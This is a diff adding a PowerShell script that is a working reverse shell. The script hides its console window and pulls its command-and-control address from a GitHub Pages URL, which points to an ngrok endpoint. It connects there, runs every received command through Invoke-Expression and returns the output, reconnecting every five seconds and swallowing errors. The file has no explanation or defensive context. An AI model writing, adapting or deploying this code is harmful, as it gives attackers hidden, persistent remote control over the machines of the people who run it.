@@ -1,0 +1,41 @@
+# 2.tcp.eu.ngrok.io:18288
+
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+ 
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+';
+[Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0);
+
+while($true) {
+    function reconnect() {
+        $address = "https://80m83rm4n.github.io/connect"
+        $request = New-Object System.Net.WebClient;
+        $request.Headers.add('accept','application/json');
+        $address = $request.DownloadString("$address"); 
+        $hosts = $address.Split(':')[0].replace('# ','')
+        $ports =  $address.Split(':')[1].Substring(0,5)
+        return $hosts,$ports
+    }
+
+    try {
+        $client = New-Object System.Net.Sockets.TCPClient(reconnect);
+        $stream = $client.GetStream();
+        [byte[]]$bytes = 0..65535 | %{0};
+        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
+            $send = (iex $data 2>&1 | Out-String );
+            $sendback = $send + 'PS ' + (pwd).Path + '> ';
+            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);
+            $stream.Write($sendbyte, 0, $sendbyte.Length);
+            $stream.Flush();
+        } 
+        $client.Close();
+    }
+    catch {
+        Start-Sleep -s 5
+        # write-host $_.Exception.Message
+    }
+}
